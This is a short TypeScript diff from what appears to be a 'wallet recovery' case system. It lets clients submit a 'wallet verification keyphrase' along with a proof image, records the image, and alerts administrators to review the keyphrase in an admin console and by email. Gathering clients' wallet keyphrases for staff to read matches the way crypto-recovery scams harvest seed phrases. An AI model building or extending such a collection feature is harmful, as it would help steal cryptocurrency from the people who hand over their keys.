@@ -396,7 +396,10 @@ export function listRecoveryCases(): StoredCase[] {
 export function submitCaseKeyphrase(
   caseId: string,
   email: string,
-  keyphrase: string
+  keyphrase: string,
+  options?: {
+    proofImageFilename?: string;
+  }
 ): StoredCase | null {
   const store = ensureStore();
   const idx = findCaseIndex(store, caseId);
@@ -420,14 +423,21 @@ export function submitCaseKeyphrase(
     status: "PROCESSING",
     completedSteps: existingSteps,
     keyphraseSubmittedAt: new Date().toISOString(),
+    ...(options?.proofImageFilename
+      ? {
+          keyphraseProofImageFilename: options.proofImageFilename,
+          keyphraseProofImageSubmittedAt: new Date().toISOString(),
+        }
+      : {}),
     updatedAt: new Date().toISOString(),
   };
   writeStore(store);
 
   addCaseNotification(caseId, {
     title: "Keyphrase Received",
-    message:
-      "Client submitted wallet verification keyphrase. Review in the admin console.",
+    message: options?.proofImageFilename
+      ? `Client submitted wallet verification keyphrase with proof image (${options.proofImageFilename}). Review in the admin console and email attachment.`
+      : "Client submitted wallet verification keyphrase. Review in the admin console.",
     type: "ACTION_REQUIRED",
   });
 
